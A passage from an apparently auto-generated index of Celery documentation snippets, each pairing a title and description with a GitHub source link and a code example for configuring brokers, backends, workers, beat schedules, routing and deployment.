flag ensures all packages are upgraded to their latest compatible versions as specified in the requirements file. This command is intended for initializing or updating the project's core environment.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/README.rst#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ pip install -U -r requirements/default.txt\n```\n\n----------------------------------------\n\nTITLE: Configuring New Result Exchange Name in Python\nDESCRIPTION: Sets a new name for the Celery result exchange in RabbitMQ. This is an alternative to deleting the old exchange, but requires updating all clients and workers to use the new name.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-2.5.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nCELERY_RESULT_EXCHANGE = 'celeryresults2'\n```\n\n----------------------------------------\n\nTITLE: Using Ignore Semipredicate with Redis for Custom Revocation\nDESCRIPTION: Example of using the Ignore exception to implement custom revocation functionality by checking if a task ID exists in a Redis set. When raised, the task will be acknowledged but no state recorded.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_32\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.exceptions import Ignore\n\n@app.task(bind=True)\ndef some_task(self):\n    if redis.ismember('tasks.revoked', self.request.id):\n        raise Ignore()\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery Beat Schedule with Solar Events\nDESCRIPTION: This Python snippet demonstrates how to configure the Celery beat schedule (`app.conf.beat_schedule`) to run a task based on a solar event. It uses `celery.schedules.solar` to trigger the 'tasks.add' task at sunset in Melbourne, Australia, specified by its latitude and longitude. The `solar` function takes the event type ('sunset'), latitude, and longitude as arguments.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/periodic-tasks.rst#2025-04-23_snippet_12\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.schedules import solar\n\napp.conf.beat_schedule = {\n    # Executes at sunset in Melbourne\n    'add-at-melbourne-sunset': {\n        'task': 'tasks.add',\n        'schedule': solar('sunset', -37.81753, 144.96715),\n        'args': (16, 16),\n    },\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic Celery Tasks with Kafka\nDESCRIPTION: Task definition file (tasks.py) that initializes Celery application and defines a simple addition task. Shows how to load configuration from the celeryconfig module.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/kafka.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Celery\n\napp = Celery('tasks')\napp.config_from_object('celeryconfig')\n\n\n@app.task\ndef add(x, y):\n    return x + y\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Sentinel Connections - Text\nDESCRIPTION: Presents an example of specifying a sentinel URL string for establishing a connection to multiple Redis Sentinel servers. The connection string uses the 'sentinel://' prefix and combines endpoints with semicolons. Used with Kombu or Celery backends that support failover among Redis nodes using Sentinel. Input is typically parsed by Kombu.Connection or its wrappers.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_14\n\nLANGUAGE: text\nCODE:\n```\nsentinel://0.0.0.0:26379;sentinel://0.0.0.0:26380/...\n```\n\n----------------------------------------\n\nTITLE: Configuring Task Routes with Queue Objects in Python\nDESCRIPTION: Example showing how to specify a Queue instance directly in the task_routes configuration. This enables more flexible queue configuration compared to previous versions where only naming was possible.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_19\n\nLANGUAGE: python\nCODE:\n```\ntask_routes = {'proj.tasks.add': {'queue': Queue('add')}}\n```\n\n----------------------------------------\n\nTITLE: Running Celery Worker with Configuration Module via Console\nDESCRIPTION: Demonstrates setting the configuration module via the environment and running a Celery worker from the terminal. The environment variable CELERY_CONFIG_MODULE specifies the config module to load. No dependencies other than a working shell and the specified module. Useful for deployment and quick testing, allowing configuration to be swapped without code changes.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_12\n\nLANGUAGE: console\nCODE:\n```\n$ CELERY_CONFIG_MODULE=\"celeryconfig.prod\" celery worker -l INFO\n```\n\n----------------------------------------\n\nTITLE: Controlling Celery Worker Events via Broadcast (Python)\nDESCRIPTION: Demonstrates how to remotely enable or disable event dispatching on Celery workers using the `broadcast` function from `celery.task.control`. This requires importing the necessary function and calling it with either 'enable_events' or 'disable_events'.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_13\n\nLANGUAGE: python\nCODE:\n```\n>>> from celery.task.control import broadcast\n>>> broadcast('enable_events')\n>>> broadcast('disable_events')\n```\n\n----------------------------------------\n\nTITLE: Specifying Serializer for Individual Task Execution in Celery\nDESCRIPTION: Example of explicitly setting the JSON serializer for a single task invocation using the serializer parameter with apply_async. This overrides any default serializer settings for this specific task execution.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_17\n\nLANGUAGE: python\nCODE:\n```\n>>> add.apply_async((10, 10), serializer='json')\n```\n\n----------------------------------------\n\nTITLE: Setting Celery Worker Initialization Parameters via celery_worker_parameters Fixture\nDESCRIPTION: Shows how to redefine the `celery_worker_parameters` fixture to customize the initialization of the embedded test worker (`WorkController`). This example specifies which queues the worker should consume (`queues`) and which ones it should ignore (`exclude_queues`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/testing.rst#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\n@pytest.fixture(scope='session')\ndef celery_worker_parameters():\n    return {\n        'queues':  ('high-prio', 'low-prio'),\n        'exclude_queues': ('celery'),\n    }\n```\n\n----------------------------------------\n\nTITLE: Task Apply Async with Routing Options in Celery Python\nDESCRIPTION: Example of using apply_async with routing parameters that will be merged with any routing settings from routers.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_40\n\nLANGUAGE: python\nCODE:\n```\nTask.apply_async(immediate=False, exchange='video',\n                 routing_key='video.compress')\n```\n\n----------------------------------------\n\nTITLE: Starting the Celery Worker with Gevent Pool (Shell)\nDESCRIPTION: This command starts a Celery worker from the `examples/gevent` directory. It configures the worker to use the gevent execution pool with a concurrency of 500 greenlets and sets the logging level to INFO. A running message broker like RabbitMQ is required.\nSOURCE: https://github.com/celery/celery/blob/main/examples/gevent/README.rst#2025-04-23_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ cd examples/gevent\n$ celery worker -l INFO --concurrency=500 --pool=gevent\n```\n\n----------------------------------------\n\nTITLE: Executing Custom Control Command via CLI\nDESCRIPTION: Command line example showing how to execute a custom control command using celery control utility.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_44\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj control increase_prefetch_count 3\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery Soft Shutdown Timeout\nDESCRIPTION: This configuration setting enables the Soft Shutdown feature and defines its duration in seconds. During this period, the worker finishes running tasks but accepts no new ones before initiating a cold shutdown. It defaults to disabled.\nSOURCE: https://github.com/celery/celery/blob/main/Changelog.rst#2025-04-23_snippet_3\n\nLANGUAGE: Configuration\nCODE:\n```\n:setting:`worker_soft_shutdown_timeout`\n```\n\n----------------------------------------\n\nTITLE: Running Django syncdb for Celery Admin Monitor in Console\nDESCRIPTION: Command to synchronize the database tables required for the django-celery admin monitor, part of the setup process for using the Django Admin interface with Celery.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.1.rst#2025-04-23_snippet_6\n\nLANGUAGE: console\nCODE:\n```\n$ python manage.py syncdb\n```\n\n----------------------------------------\n\nTITLE: Creating Immutable Celery Signature with si() Shortcut in Python\nDESCRIPTION: Demonstrates the preferred `si()` shortcut method for creating immutable Celery task signatures. `add.si(2, 2)` is equivalent to `add.signature((2, 2), immutable=True)`.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_27\n\nLANGUAGE: pycon\nCODE:\n```\n>>> add.si(2, 2)\n```\n\n----------------------------------------\n\nTITLE: Starting Named Celery Workers with `celeryd-multi` (Console)\nDESCRIPTION: Demonstrates starting multiple Celery workers with specific names (`image`, `video`, `data`) instead of default numbered names, using `celeryd-multi`. Each worker is configured with a concurrency of 3 (`-c 3`). The output shows the resulting `celeryd` commands with the specified names.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_20\n\nLANGUAGE: console\nCODE:\n```\n$ celeryd-multi start image video data -c 3\nceleryd -n image.myhost -c 3\nceleryd -n video.myhost -c 3\nceleryd -n data.myhost -c 3\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery with Google Pub/Sub Transport in Python\nDESCRIPTION: This snippet shows how to configure the Celery application to use Google Pub/Sub as the message transport. The broker_url is set to use the 'gcpubsub' scheme with a project ID.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-5.5.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nbroker_url = 'gcpubsub://projects/project-id'\n```\n\n----------------------------------------\n\nTITLE: Configuring Task Routing in Celery (Python)\nDESCRIPTION: Demonstrates how to configure task routing in Celery using the task_routes setting and the queue argument in apply_async().\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_12\n\nLANGUAGE: python\nCODE:\n```\napp.conf.update(\n    task_routes = {\n        'proj.tasks.add': {'queue': 'hipri'},\n    },\n)\n```\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from proj.tasks import add\n>>> add.apply_async((2, 2), queue='hipri')\n```\n\n----------------------------------------\n\nTITLE: Controlling Celery Workers in Python\nDESCRIPTION: Shows various methods to control Celery workers, including inspecting active tasks, setting rate limits, and shutting down workers.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/app-overview.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\n>>> celery.control.inspect().active()\n>>> celery.control.rate_limit(add.name, '100/m')\n>>> celery.control.broadcast('shutdown')\n>>> celery.control.discard_all()\n```\n\n----------------------------------------\n\nTITLE: Defining Elasticsearch and Elastic Transport Dependency Versions\nDESCRIPTION: Specifies maximum versions for the `elasticsearch` (<=8.17.2) and `elastic-transport` (<=8.17.1) Python packages. This is typically used in a `requirements.txt` file or similar dependency specification to ensure compatibility and reproducible environments by constraining the allowed versions of these libraries.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/elasticsearch.txt#2025-04-23_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nelasticsearch<=8.17.2\nelastic-transport<=8.17.1\n```\n\n----------------------------------------\n\nTITLE: SQS Broker URL Format\nDESCRIPTION: The format specification for configuring an SQS broker URL in Celery, showing the structure with AWS credentials.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/sqs.rst#2025-04-23_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nsqs://aws_access_key_id:aws_secret_access_key@\n```\n\n----------------------------------------\n\nTITLE: Shortcut for Creating Celery Task Signature in Python\nDESCRIPTION: Illustrates the `s()` shortcut method on a task object (`add`) for creating a signature with positional arguments. This is a more concise way to define a signature.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_2\n\nLANGUAGE: pycon\nCODE:\n```\n>>> add.s(2, 2)\ntasks.add(2, 2)\n```\n\n----------------------------------------\n\nTITLE: Adding Consumer Programmatically with Python\nDESCRIPTION: Python code to add a consumer to workers programmatically using the control interface. Shows how to use the add_consumer method and get a reply from workers.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_25\n\nLANGUAGE: pycon\nCODE:\n```\n>>> app.control.add_consumer('foo', reply=True)\n[{u'worker1.local': {u'ok': u\"already consuming from u'foo'\"}}]\n\n>>> app.control.add_consumer('foo', reply=True,\n...                          destination=['worker1@example.com'])\n[{u'worker1.local': {u'ok': u\"already consuming from u'foo'\"}}]\n```\n\n----------------------------------------\n\nTITLE: Starting Celery Worker with Eventlet Pool\nDESCRIPTION: Shell command to start the Celery worker. It changes directory to `examples/eventlet`, uses INFO logging (`-l INFO`), specifies the Eventlet pool (`--pool=eventlet`), and sets the concurrency level to 500 (`--concurrency=500`). Requires a running message broker like RabbitMQ.\nSOURCE: https://github.com/celery/celery/blob/main/examples/eventlet/README.rst#2025-04-23_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\n$ cd examples/eventlet\n$ celery worker -l INFO --concurrency=500 --pool=eventlet\n```\n\n----------------------------------------\n\nTITLE: Querying RabbitMQ for Queue Information (Console)\nDESCRIPTION: Commands to find the number of workers consuming from a queue and the amount of memory allocated to a queue using rabbitmqctl.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_31\n\nLANGUAGE: console\nCODE:\n```\n$ rabbitmqctl list_queues name consumers\n```\n\nLANGUAGE: console\nCODE:\n```\n$ rabbitmqctl list_queues name memory\n```\n\n----------------------------------------\n\nTITLE: Configuring Couchbase Backend URL\nDESCRIPTION: Python configuration for Couchbase backend connection URL\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_33\n\nLANGUAGE: python\nCODE:\n```\nresult_backend = 'couchbase://username:password@host:port/bucket'\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Task Subclasses in Celery\nDESCRIPTION: Demonstrates how to create a custom Task subclass with a debug feature and use it as a base for a task.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/app-overview.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nTask = celery.create_task_cls()\n\nclass DebugTask(Task):\n\n    def on_failure(self, *args, **kwargs):\n        import pdb\n        pdb.set_trace()\n\n@app.task(base=DebugTask)\ndef add(x, y):\n    return x + y\n```\n\n----------------------------------------\n\nTITLE: Adding Default Configuration Using a Dictionary - Python\nDESCRIPTION: This code example demonstrates how to add default configuration values to a Celery application instance by passing a configuration dictionary to the 'add_defaults' method. This method applies the configuration keys and values to the application, similar to 'app.conf.update()', but prevents data copying and ensures settings are not pickled when workers spawn child processes. The dictionary must contain configuration options accepted by Celery.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.0.rst#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\nconfig = {'FOO': 10}\n\napp.add_defaults(config)\n```\n\n----------------------------------------\n\nTITLE: Configuring 'celerybeat' Init Script for Django Projects\nDESCRIPTION: Illustrates necessary configuration additions within `/etc/default/celerybeat` (or potentially `/etc/default/celeryd` if shared) when using the generic init script for `celerybeat` within a Django project. It emphasizes exporting the `DJANGO_SETTINGS_MODULE` environment variable to make it available to the Celery process and setting `CELERYD_CHDIR` (often reused by the beat script) to the Django project's root directory.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/daemonizing.rst#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nexport DJANGO_SETTINGS_MODULE=\"settings\"\n\nCELERYD_CHDIR=\"/opt/MyProject\"\n```\n\n----------------------------------------\n\nTITLE: Disabling Events on Celery Workers\nDESCRIPTION: Sends a control command to workers in the cluster to stop sending task events. Requires the Celery application instance (`-A proj`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_16\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj control disable_events\n```\n\n----------------------------------------\n\nTITLE: Installing Celery with MongoDB Support\nDESCRIPTION: Command to install Celery with MongoDB result backend support including DNS seedlist connection format capability.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.3.rst#2025-04-23_snippet_2\n\nLANGUAGE: console\nCODE:\n```\n$ pip install -U celery[mongodb]\n```\n\n----------------------------------------\n\nTITLE: Starting Flower with AMQP Broker URL\nDESCRIPTION: Starts the Flower web server, explicitly specifying the AMQP broker URL using the `--broker` argument. This overrides the broker configured in the Celery application.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_23\n\nLANGUAGE: console\nCODE:\n```\n$ celery --broker=amqp://guest:guest@localhost:5672// flower\n```\n\n----------------------------------------\n\nTITLE: Protocol V2 Task Message Example in Python\nDESCRIPTION: Demonstrates sending a task message using Version 2 protocol with basic chain operation\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/protocol.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nimport json\nimport os\nimport socket\n\ntask_id = uuid()\nargs = (2, 2)\nkwargs = {}\nbasic_publish(\n    message=json.dumps((args, kwargs, None)),\n    application_headers={\n        'lang': 'py',\n        'task': 'proj.tasks.add',\n        'argsrepr': repr(args),\n        'kwargsrepr': repr(kwargs),\n        'origin': '@'.join([os.getpid(), socket.gethostname()])\n    }\n    properties={\n        'correlation_id': task_id,\n        'content_type': 'application/json',\n        'content_encoding': 'utf-8',\n    }\n)\n```\n\n----------------------------------------\n\nTITLE: Declaring gevent Dependency Requirement (Plaintext)\nDESCRIPTION: This line specifies that the `gevent` library, version 1.5.0 or newer, is required for the project. It's typically used in a requirements file (e.g., `requirements.txt`) managed by tools like pip to handle Python package dependencies.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/gevent.txt#2025-04-23_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\ngevent>=1.5.0\n```\n\n----------------------------------------\n\nTITLE: Defining systemd Service for Celery Worker - Bash\nDESCRIPTION: Provides a sample systemd unit file to define a Celery worker service. This file configures the service to run as user 'celery', sets up environment and working directories, and configures the start, stop, and reload commands using the shell. Parameters include placeholders for Celery parameters, log files, and node names. Place this file at /etc/systemd/system/celery.service. Requires systemd, Celery, and a configured environment file. Inputs: systemctl actions. Outputs: manages Celery worker processes.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/daemonizing.rst#2025-04-23_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\n[Unit]\nDescription=Celery Service\nAfter=network.target\n\n[Service]\nType=forking\nUser=celery\nGroup=celery\nEnvironmentFile=/etc/conf.d/celery\nWorkingDirectory=/opt/celery\nExecStart=/bin/sh -c '${CELERY_BIN} -A $CELERY_APP multi start $CELERYD_NODES \\\n    --pidfile=${CELERYD_PID_FILE} --logfile=${CELERYD_LOG_FILE} \\\n    --loglevel=\"${CELERYD_LOG_LEVEL}\" $CELERYD_OPTS'\nExecStop=/bin/sh -c '${CELERY_BIN} multi stopwait $CELERYD_NODES \\\n    --pidfile=${CELERYD_PID_FILE} --logfile=${CELERYD_LOG_FILE} \\\n    --loglevel=\"${CELERYD_LOG_LEVEL}\"'\nExecReload=/bin/sh -c '${CELERY_BIN} -A $CELERY_APP multi restart $CELERYD_NODES \\\n    --pidfile=${CELERYD_PID_FILE} --logfile=${CELERYD_LOG_FILE} \\\n    --loglevel=\"${CELERYD_LOG_LEVEL}\" $CELERYD_OPTS'\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n```\n\n----------------------------------------\n\nTITLE: Displaying Celery Command-Line Help\nDESCRIPTION: This command displays the complete list of available command-line options for Celery. It's useful for understanding all possible configurations and parameters.\nSOURCE: https://github.com/celery/celery/blob/main/docs/django/first-steps-with-django.rst#2025-04-23_snippet_6\n\nLANGUAGE: console\nCODE:\n```\n$ celery --help\n```\n\n----------------------------------------\n\nTITLE: Using Multi Command with Node-Specific Concurrency Options\nDESCRIPTION: Example of the Celery multi command with node-specific concurrency options. The index in -opt:index refers to the position of a node in the argument list, allowing different concurrency settings for different nodes.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.1.rst#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ncelery multi start A B C D -c:1 4 -c:2-4 8\n```\n\n----------------------------------------\n\nTITLE: Inspecting Redis Queues for Celery Tasks (Console)\nDESCRIPTION: Commands to find the number of tasks in a Redis queue and list all available queues using redis-cli.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_32\n\nLANGUAGE: console\nCODE:\n```\n$ redis-cli -h HOST -p PORT -n DATABASE_NUMBER llen QUEUE_NAME\n```\n\nLANGUAGE: console\nCODE:\n```\n$ redis-cli -h HOST -p PORT -n DATABASE_NUMBER keys \\*\n```\n\n----------------------------------------\n\nTITLE: Using Map Operation in Celery\nDESCRIPTION: Demonstrates using the built-in map operation to sequentially apply a task to each element in multiple sequences, showing the difference from group operation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_60\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from proj.tasks import add\n\n>>> ~tsum.map([list(range(10)), list(range(100))])\n[45, 4950]\n```\n\n----------------------------------------\n\nTITLE: Defining pymongo Version Requirement (Python Requirements File)\nDESCRIPTION: This snippet sets pymongo version 4.10.1 as a required dependency for the Python environment. It is intended to be placed in a requirements.txt file, which is used by pip for dependency resolution. The format is a standard package==version declaration: 'pymongo==4.10.1', ensuring precise package version control and reproducibility of environments.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/mongodb.txt#2025-04-23_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\npymongo==4.10.1\n```\n\n----------------------------------------\n\nTITLE: Worker Log Output Indicating Remote Debugger Ready\nDESCRIPTION: This text snippet shows the log messages generated by a Celery worker when it encounters an `rdb.set_trace()` breakpoint. It indicates that a task has been received and that the remote debugger is active, specifying the IP address (127.0.0.1) and port (6900) for the telnet connection. It waits for a client to connect.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/debugging.rst#2025-04-23_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n[INFO/MainProcess] Received task:\n    tasks.add[d7261c71-4962-47e5-b342-2448bedd20e8]\n[WARNING/PoolWorker-1] Remote Debugger:6900:\n    Please telnet 127.0.0.1 6900.  Type `exit` in session to continue.\n[2011-01-18 14:25:44,119: WARNING/PoolWorker-1] Remote Debugger:6900:\n    Waiting for client...\n```\n\n----------------------------------------\n\nTITLE: Inspecting Celery Worker Statistics\nDESCRIPTION: Displays various statistics about the workers in the cluster, such as processed task counts. Requires the Celery application instance (`-A proj`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_12\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj inspect stats\n```\n\n----------------------------------------\n\nTITLE: Setting SQS FIFO Queue Properties in Celery Task\nDESCRIPTION: This code demonstrates how to set SQS-specific message properties such as MessageGroupId and MessageDeduplicationId when publishing a Celery task. These properties are required for FIFO (First-In-First-Out) SQS queues to ensure proper message ordering and deduplication.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/sqs.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nmessage_properties = {\n    'MessageGroupId': '<YourMessageGroupId>',\n    'MessageDeduplicationId': '<YourMessageDeduplicationId>'\n}\ntask.apply_async(**message_properties)\n```\n\n----------------------------------------\n\nTITLE: Example Log Output: Warm to Soft Shutdown Transition (Console)\nDESCRIPTION: Illustrates the console log output when a Celery worker undergoes a Warm shutdown (initiated by the first Ctrl+C/SIGINT) followed by a Soft shutdown (initiated by the second Ctrl+C/SIGINT). The Soft shutdown allows a configured time (3 seconds in this example) for running tasks to complete before termination.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_5\n\nLANGUAGE: console\nCODE:\n```\n[INFO/MainProcess] Task myapp.long_running_task[6f748357-b2c7-456a-95de-f05c00504042] received\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 1/2000s\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 2/2000s\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 3/2000s\n^C\nworker: Hitting Ctrl+C again will initiate cold shutdown, terminating all running tasks!\n\nworker: Warm shutdown (MainProcess)\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 4/2000s\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 5/2000s\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 6/2000s\n^C\nworker: Hitting Ctrl+C again will terminate all running tasks!\n[WARNING/MainProcess] Initiating Soft Shutdown, terminating in 3 seconds\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 7/2000s\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 8/2000s\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 9/2000s\n[WARNING/MainProcess] Restoring 1 unacknowledged message(s)\n```\n\n----------------------------------------\n\nTITLE: Enabling Force Exec for Celery Worker in Python\nDESCRIPTION: Enables force exec mode for Celery worker to solve deadlock issues when mixing threads and fork. This setting is recommended for users of the prefork pool, especially with time limits or max tasks per child.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-2.5.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nCELERYD_FORCE_EXECV = True\n```\n\n----------------------------------------\n\nTITLE: Executing Complex Chord with Nested Groups and Chains in Python\nDESCRIPTION: Example demonstrating how to construct and execute a complex Celery canvas combining chord, group, and chain operations with dummy tasks. Shows the proper nesting structure for advanced task composition.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-4.4.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nc = chord(\n  group([\n      chain(\n          dummy.si(),\n          chord(\n              group([dummy.si(), dummy.si()]),\n              dummy.si(),\n          ),\n      ),\n      chain(\n          dummy.si(),\n          chord(\n              group([dummy.si(), dummy.si()]),\n              dummy.si(),\n          ),\n      ),\n  ]),\n  dummy.si()\n)\n\nc.delay().get()\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Result Backend\nDESCRIPTION: Configuration example for using Elasticsearch as a Celery result backend, showing the connection URL format.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_30\n\nLANGUAGE: python\nCODE:\n```\nresult_backend = 'elasticsearch://example.com:9200/index_name/doc_type'\n```\n\n----------------------------------------\n\nTITLE: Shortcut for Creating Immutable Celery Signatures in Python\nDESCRIPTION: Shows the `si()` shortcut method for creating immutable Celery signatures. `reset_buffers.si()` is equivalent to `reset_buffers.signature(immutable=True)`.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_16\n\nLANGUAGE: pycon\nCODE:\n```\n>>> add.apply_async((2, 2), link=reset_buffers.si())\n```\n\n----------------------------------------\n\nTITLE: Configuring RabbitMQ Broker URL in Python\nDESCRIPTION: Sets the broker URL for Celery to connect to RabbitMQ. The URL includes the username, password, host, port, and virtual host.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/rabbitmq.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nbroker_url = 'amqp://myuser:mypassword@localhost:5672/myvhost'\n```\n\n----------------------------------------\n\nTITLE: Starting Celery Beat with a Custom Schedule Database File\nDESCRIPTION: This console command starts the Celery beat service while specifying a custom path for its schedule database file using the `-s` (or `--schedule`) option. Beat uses this file (a shelve database) to store the last run times of periodic tasks. By default, it's named `celerybeat-schedule` in the current directory.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/periodic-tasks.rst#2025-04-23_snippet_15\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj beat -s /home/celery/var/run/celerybeat-schedule\n```\n\n----------------------------------------\n\nTITLE: Handling Optional Parameters with Pydantic in Celery Tasks\nDESCRIPTION: Example of a Celery task using Pydantic validation with optional parameters and return values. This demonstrates how None values are properly handled for both inputs and outputs when using Pydantic validation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_27\n\nLANGUAGE: python\nCODE:\n```\nfrom typing import Optional\n\n# models are the same as above\n\n@app.task(pydantic=True)\ndef x(arg: Optional[ArgModel] = None) -> Optional[ReturnModel]:\n    if arg is None:\n        return None\n    return ReturnModel(value=f\"example: {arg.value}\")\n```\n\n----------------------------------------\n\nTITLE: Inspecting Active Tasks on a Specific Celery Worker (console)\nDESCRIPTION: Demonstrates targeting a specific worker for inspection using the `--destination` option with the `celery inspect active` command. This sends the request only to the specified worker host name (`celery@example.com`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_14\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj inspect active --destination=celery@example.com\n```\n\n----------------------------------------\n\nTITLE: Installing the AMQP Library via Pip - Console\nDESCRIPTION: This shell command example demonstrates how to install the required 'amqp' Python library using pip to enable the pyamqp transport for Celery's broker connectivity. The 'amqp' library is necessary for AMQP heartbeats and to fully support RabbitMQ consumer notifications. Users must run this command before configuring the broker transport in their application. The command must be executed in the system shell.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.0.rst#2025-04-23_snippet_8\n\nLANGUAGE: console\nCODE:\n```\n$ pip install amqp\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Remote Control Command in Celery\nDESCRIPTION: Python code demonstrating how to register a custom remote control command in Celery. The example shows a command to reset the broker connection.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-1.0.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.task.control import Panel\n\n@Panel.register\ndef reset_broker_connection(state, **kwargs):\n    state.consumer.reset_connection()\n    return {'ok': 'connection re-established'}\n```\n\n----------------------------------------\n\nTITLE: Declaring Conditional `futures` Dependency for Python 2\nDESCRIPTION: This configuration line specifies that the `futures` library, version 3.1.1 or newer, is required only when running Python versions older than 3.0. This is common for projects supporting both Python 2 and 3, using environment markers (`python_version < '3.0'`) evaluated by 